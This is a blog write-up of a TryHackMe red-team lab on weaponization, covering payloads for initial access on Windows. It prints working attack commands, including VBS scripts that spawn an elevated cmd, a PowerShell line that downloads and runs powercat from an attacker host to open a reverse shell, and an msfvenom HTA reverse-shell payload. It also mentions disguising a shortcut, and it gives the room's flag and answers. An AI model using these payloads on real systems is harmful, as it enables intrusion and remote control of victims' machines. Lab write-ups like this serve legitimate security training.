---
title: Weaponization   
author: CYB3RM3
name: CYB3RM3 | Weaponization  
date: 2021-12-26 21:50:07 +0100
categories: [TryHackMe, Initial Access]
tags: [Red Team, Weaponization]
---

Understand and explore common red teaming weaponization techniques. You will learn to build custom payloads using common methods seen in the industry to get initial access.

THM Room [https://tryhackme.com/room/weaponization](https://tryhackme.com/room/weaponization)


## TASK 1 : Introduction
### Let's deploy the target machine in the next task, and we'll get started with the Windows Script Host technique in the subsequent task ! 
No Answer

## TASK 2 : Deploy the Windows Machine 
### Deploy the attached Windows machine and connect to it via the RDP client. Once this is done, move to the next task. 
No Answer

## TASK 3 : Windows Scripting Host - WSH
### Try to replace the calc.exe binary to execute cmd.exe within the Windows machine. 
I tried two codes. Payloads.vbs to launch cmd.exe as user, payloads2.vbs for cmd administrator :

payloads.vbs
```console
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\cmd.exe " & WScript.ScriptFullName),0,True
```
{: .nolineno }

payloads2.vbs

```console
Set oShell = CreateObject("Shell.Application")
oShell.ShellExecute "cmd.exe", , , "runas", 1
```
{: .nolineno }

No Answer
## TASK 4 : An HTML Application - HTA 
### Now, apply what we discussed to receive a reverse connection using the user simulation machine in the Practice Arena task. 
Practiced and test different payload such as msfvenom command line directly or metasploit module. Get back multiple shell and offuscate link in shortcut on user's desktop and rename like "bank".

![Practice](/images/thm/weaponization/weaponization_1.png)
_Practice_

No Answer

## TASK 5 : Visual Basic for Application - VBA 
### Now replicate and apply what we discussed to get a reverse shell!

![HTA](/images/thm/weaponization/weaponization_2.png)
_HTA_

No Answer

## TASK 6 : PowerShell - PSH  
### Apply what you learned in this task. In the next task, we will discuss Command and Control frameworks! 

First, on attack machine :

```console
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 6666
```
{: .nolineno }

Then in another tab of terminal :

```console
nc -lnvp 1337
```
{: .nolineno }

On victim machine in cmd :

```console
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.188.37:6666/powercat.ps1');powercat -c 10.10.188.37 -p 1337 -e cmd"
```
{: .nolineno }

You'll now have a shell on your attack machine's listener !

![PSH](/images/thm/weaponization/weaponization_3.png)
_PSH_

No Answer

## TASK 7 : Command And Control - (C2 Or C&C) 
### Read the above. 
No Answer

## TASK 8 : Delivery Techniques
### Which method is used to distribute payloads to a victim at social events?
Answer : Web Delivery

## TASK 9 : Practice Arena 
###  What is the flag? 
Execute hta exploit for example :

```console
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.188.37 LPORT=9933 -f hta-psh -o thm.hta
```
{: .nolineno }

Visiting url : http://10.10.188.37:666/thm.hta give us a reverse shell.

```console
type /Users/thm/Desktop/flag.txt
```
{: .nolineno }

Answer : THM{b4dbc2f16afdfe9579030a929b799719}